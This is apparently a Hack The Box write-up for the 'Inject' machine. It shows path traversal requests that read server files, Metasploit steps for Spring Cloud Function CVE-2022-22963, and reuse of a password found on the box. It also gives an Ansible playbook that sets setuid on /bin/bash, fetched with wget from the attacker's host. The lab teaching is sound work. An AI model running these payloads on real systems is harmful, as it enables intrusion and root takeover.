# Inject HTB machine

**A machine with a web service that is vulnerable to Local File Inclusion (LFI) and has a vulnerability in the Spring Cloud module of the Spring framework.**

After copying the ip address of the machine, we try to access the machine website but we do not get any response. Let's scan the ports of the machine with nmap:

```
nmap -sV 10.10.11.204
```

We get the following message:

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-21 15:10 EDT
Nmap scan report for inject.htb (10.10.11.204)
Host is up (0.041s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  nagios-nsca Nagios NSCA
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.69 seconds
```

So, port 8080 is open instead of port 80 which is the default port for web services. Let's try to access the specific port by entering "10.10.11.204:8080" in the navigation menu of the browser.

After examinating the web page, we find an upload section where we can upload a picture and view it. We can try uploading a picture and use burpsuite to examine the requests. If we click on "View your image" we can check that the request is the following:

```
GET /show_image?img=test_image.png HTTP/1.1
Host: 10.10.11.204:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.11.204:8080/upload
Upgrade-Insecure-Requests: 1
```

So we can observer that it is requesting the image file from the server. "?img=test_image.png" is a query parameter appended to the URL. It specifies additional information for the server. In this case, it indicates that the requested resource is an image file named "test_image.png". Let's try if the website is vulnerable to Local File Inclusion (LFI). Instead of "test_image.png" we can provide a LFI command like "../../../../../../../". After trying out LFI commands we can see that the website is indead vulnerable to that. After examinating the machine structure, we find the file "pom.xml" that specifies that the Spring framework version 2.6.5 is being used. This is the request to see the file:

```
GET /show_image?img=../../../../../../../var/www/WebApp/pom.xml HTTP/1.1
Host: 10.10.11.204:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.11.204:8080/upload
Upgrade-Insecure-Requests: 1
```


The specific version has a vulnerability in the cloud function, as mentioned in the following website:

https://nvd.nist.gov/vuln/detail/CVE-2022-22963

We can find the exploit in the following link:

https://www.rapid7.com/db/modules/exploit/multi/http/spring_cloud_function_spel_injection/

We can use metasploit to achieve connection with the machine. Execute "msfconsole", "use exploit/multi/http/spring_cloud_function_spel_injection", "set lhost 10.10.16.54" (put your ip), "set rhost 10.10.11.204", "run", "shell". Now you can check that you have achieved connection by executing a command, like "whoami". You are connected as user "frank". 

After examinating the machine, we find the file "/home/frank/.m2" that contains the login credentials for the "phil" user. We can try "su phil" and the password in the file "DocPhillovestoInject123". Now, we can get the user flag under phil's directory.

We need to search clues and potential entry points for privilege escalation. We can find a file named "playbook_1.yml" under the directory "/opt/automation/tasks". It is a snippet of a YAML file, specifically an Ansible playbook. Ansible is an open-source automation tool used for configuring and managing systems. This documentation contains valuable information to help us construct a playbook file so we can achieve privilege escalation. Let's create the following file in our pc:

```
- hosts: localhost
  tasks:
  - name: Get Root
    command: chmod u+s /bin/bash
    become: true
```

Here's a breakdown of what this playbook does:

hosts: localhost: Specifies that the playbook tasks will be executed on the local machine where Ansible is being run.

tasks: Represents a list of tasks to be performed on the target host.

name: Get Root: Provides a descriptive name for the task, indicating the intention to obtain root access.

command: chmod u+s /bin/bash: Executes the command chmod u+s /bin/bash as a task. This command sets the "setuid" bit on the /bin/bash executable. The "setuid" bit, when set on an executable file, allows the user who executes it to gain the privileges of the file's owner, in this case, root. By setting the "setuid" bit on /bin/bash, any user who executes /bin/bash will effectively gain root privileges.

become: true: Indicates that the task should be executed with privilege escalation. The become keyword is used in Ansible to escalate the user's privileges to perform privileged actions. In this case, it aims to execute the command with root privileges.

We can start a server in our pc by executing "python3 -m http.server". Then we can retrieve the file from the machine by executing "wget http://10.10.16.54:8000/playbook_2.yml"(substitute with your ip). Then, once the file is in the "/opt/automation/tasks/" folder, we can execute "bash -p" to turn on privileged mode. In this mode, the $BASH_ENV and $ENV files are not processed, shell functions are not inherited from the environment, and the SHELLOPTS, BASHOPTS, CDPATH, and GLOBIGNORE variables, if they appear in the environment, are ignored. If the shell is started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, no startup files are read, shell functions are not inherited from the environment, the SHELLOPTS, BASHOPTS, CDPATH, and GLOBIGNORE variables, if they appear in the environment, are ignored, and the effective user id is set to the real user id. If the -p option is supplied at invocation, the startup behavior is the same, but the effective user id is not reset.

Now, if we execute "whoami" we can see that we achieved "root" access.

Congrats! We are now "root" user and we can display the root flag under the "/root" directory.
